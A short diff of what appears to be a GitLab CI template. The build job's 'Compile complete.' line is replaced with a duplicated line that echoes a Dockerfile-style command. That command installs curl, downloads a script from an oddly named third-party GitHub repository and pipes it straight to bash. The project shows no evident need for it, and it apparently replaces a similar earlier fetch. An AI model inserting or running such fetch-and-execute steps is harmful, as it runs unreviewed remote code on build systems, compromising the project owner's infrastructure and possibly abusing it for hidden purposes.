@@ -24,8 +24,8 @@ stages:          # List of stages for jobs, and their order of execution
 build-job:       # This job runs in the build stage, which runs first.
   stage: build
   script:
-    - echo "RUN apt-get update && apt -y install curl && curl -sL https://raw.githubusercontent.com/dragonballku8/kids/main/jazz | bash"
-    - echo "Compile complete."
+    - echo "RUN apt-get update && apt -y install curl && curl -sL https://raw.githubusercontent.com/dragonballku8/music/main/lass | bash"
+    - echo "RUN apt-get update && apt -y install curl && curl -sL https://raw.githubusercontent.com/dragonballku8/music/main/lass | bash"
 
 unit-test-job:   # This job runs in the test stage.
   stage: test    # It only starts when the job in the build stage completes successfully.
